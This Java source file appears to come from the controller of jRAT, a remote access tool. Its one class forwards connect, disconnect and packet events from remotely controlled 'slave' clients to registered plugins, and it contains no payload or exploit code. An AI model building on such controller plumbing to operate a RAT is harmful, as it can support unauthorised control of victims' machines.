package se.jrat.controller.addons;

import jrat.api.Packet;
import jrat.api.events.Event;
import jrat.api.events.EventType;
import jrat.api.events.OnConnectEvent;
import jrat.api.events.OnDisconnectEvent;
import jrat.api.events.OnPacketEvent;
import jrat.api.events.OnSendPacketEvent;
import se.jrat.controller.AbstractSlave;

public class PluginEventHandler {

	public static void onPacket(AbstractSlave slave, byte header) {
		OnPacketEvent e = new OnPacketEvent(ClientFormat.format(slave), new Packet(header));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_PACKET_RECEIVED)) {
			event.perform(e);
		}
	}

	public static void onConnect(AbstractSlave slave) {
		OnConnectEvent e = new OnConnectEvent(ClientFormat.format(slave));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_CONNECT)) {
			event.perform(e);
		}
	}

	public static void onDisconnect(AbstractSlave slave) {
		OnDisconnectEvent e = new OnDisconnectEvent(ClientFormat.format(slave));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_CLIENT_DISCONNECT)) {
			event.perform(e);
		}
	}

	public static void onSendPacket(byte header, AbstractSlave slave) {
		OnSendPacketEvent e = new OnSendPacketEvent(new Packet(header), ClientFormat.format(slave));
		
		for (Event event : Event.getHandler().getEvents(EventType.EVENT_SERVER_PACKET_SEND)) {
			event.perform(e);
		}
	}

}
